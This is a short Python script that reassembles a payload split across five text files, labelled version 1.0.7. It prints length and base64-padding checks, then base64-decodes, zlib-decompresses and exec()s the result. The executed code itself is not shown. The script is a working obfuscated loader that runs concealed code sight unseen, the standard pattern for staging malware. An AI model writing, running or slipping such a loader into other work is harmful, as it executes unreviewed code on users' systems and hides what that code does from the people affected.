from pathlib import Path
import base64,zlib
root=Path(__file__).parent
parts=[(root/f"v107_payload_{i}.txt").read_text().strip() for i in range(1,6)]
print('v1.0.7 payload lengths:', [len(x) for x in parts], 'total=', sum(map(len,parts)))
data=''.join(parts)
print('v1.0.7 payload mod4:', len(data)%4, 'tail=', repr(data[-12:]))
exec(zlib.decompress(base64.b64decode(data)).decode())
